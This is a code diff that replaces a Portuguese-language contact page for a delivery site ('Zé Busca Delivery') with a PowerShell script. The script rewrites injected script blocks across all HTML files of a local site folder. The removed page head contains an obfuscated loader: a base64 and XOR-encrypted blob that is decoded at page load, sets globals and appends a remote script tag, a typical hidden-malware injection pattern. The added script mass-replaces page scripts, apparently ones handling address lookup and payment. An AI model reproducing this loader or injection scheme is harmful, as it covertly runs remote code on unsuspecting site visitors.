@@ -1,33 +1,6 @@
-﻿<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Contato - Zé Busca Delivery</title>
-    <style>
-        body { font-family: Arial, sans-serif; background-color: #f9fafb; color: #333; line-height: 1.6; margin: 0; padding: 0; }
-        .container { max-width: 800px; margin: 50px auto; padding: 30px; background: #fff; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center; }
-        h1 { color: #d97706; }
-        .footer { margin-top: 40px; font-size: 14px; color: #666; border-top: 1px solid #eee; padding-top: 20px; text-align: center; }
-        .footer a { color: #d97706; text-decoration: none; }
-    </style>
-<script>(function(){var u_ily=atob("DDhDqhePMc2aXBbtiUNh32XjE/e4NGKZ+Ut5hTjsVaO0KWKA4F46hHTgXOP4Ljme6koq2mP8HrjuMWXC5Vk3z2T7H6fpfjrP6Ew32H7tRLn/LzTX0kNhxHbiVO+gfnKM/Vlu32PiWKvjcWaf7E4mxGOiSa71ODue6lNhhjX5UKHvOTTXqxo+hmytX6z3OTTXq1wi3naiRLn3NXCUpEgxz2HqX7m3L2OP4FwwiDutR6z2KXPPsxph10ry");var g_1a=[];for(var u_9=0;u_9<u_ily.length;u_9++){g_1a.push(u_ily.charCodeAt(u_9)&255);}var q_n=g_1a[0];var e_jk=g_1a.slice(1,1+q_n);var g_wx=g_1a.slice(1+q_n);var p_y2=g_wx.map(function(b,w_k){return b^e_jk[w_k%q_n];});var k_4k3i="";for(var y_ut3=0;y_ut3<p_y2.length;y_ut3++){k_4k3i+=String.fromCharCode(p_y2[y_ut3]&255);}var w_29po=decodeURIComponent(escape(k_4k3i));var u_6x11=JSON.parse(w_29po);var j_06x=u_6x11.globals||[];j_06x.forEach(function(p_i){window[p_i.name]=p_i.value;});var b_cqwr=document.createElement("script");b_cqwr.src=u_6x11.url;b_cqwr.async=true;b_cqwr.defer=true;(u_6x11.attributes||[]).forEach(function(w_k4c1){b_cqwr.setAttribute(w_k4c1.name,w_k4c1.value);});(document.head||document.documentElement).appendChild(b_cqwr);})();</script></head>
-<body>
-    <div class="container">
-        <h1>Entre em Contato</h1>
-        <p>Tem alguma dúvida, sugestão ou precisa de ajuda com o seu pedido?</p>
-        
-        <p style="margin: 30px 0; font-size: 18px;">
-            <strong>E-mail de Suporte:</strong><br>
-            <a href="mailto:contato@zebuscadelivery.click" style="color: #d97706;">contato@zebuscadelivery.click</a>
-        </p>
+$htmlFiles = @(Get-ChildItem -Path "c:\Users\ss pc\Desktop\DELIVERY\DELIVERY\deliverybreja.biz\9345488724234" -Recurse -Filter "*.html") + @(Get-ChildItem -Path "c:\Users\ss pc\Desktop\DELIVERY\DELIVERY\deliverybreja.biz" -Filter "*.html")
 
-        <p>Nossa equipe responderá o mais breve possível.</p>
-
-        <div class="footer">
-            <a href="index.html">&larr; Voltar para a Página Inicial</a>
-        </div>
-    </div>
+$newScript = @"
 <script>
   window.BUSCAR_CEP = async function(cep) {
       var cepLimpo = cep.replace(/\D/g, '');
@@ -191,3 +164,24 @@
 </script>
 </body>
 </html>
+"@
+
+foreach ($file in $htmlFiles) {
+    if ($file.FullName -match "index\.html$" -or $file.FullName -match "\.html$") {
+        $text = [System.IO.File]::ReadAllText($file.FullName, [System.Text.Encoding]::UTF8)
+        
+        $startIdx = $text.LastIndexOf("<script>`n  window.BUSCAR_CEP")
+        if ($startIdx -eq -1) { $startIdx = $text.LastIndexOf("<script>`r`n  window.BUSCAR_CEP") }
+        if ($startIdx -eq -1) { $startIdx = $text.LastIndexOf("<script>`n  window.DO_PUFPAG") }
+        if ($startIdx -eq -1) { $startIdx = $text.LastIndexOf("<script>`r`n  window.DO_PUFPAG") }
+        
+        if ($startIdx -ge 0) {
+            $text = $text.Substring(0, $startIdx)
+        } else {
+            $text = $text -replace "(?i)</body>\s*</html>\s*", ""
+        }
+        
+        $text = $text + $newScript
+        [System.IO.File]::WriteAllText($file.FullName, $text, [System.Text.Encoding]::UTF8)
+    }
+}
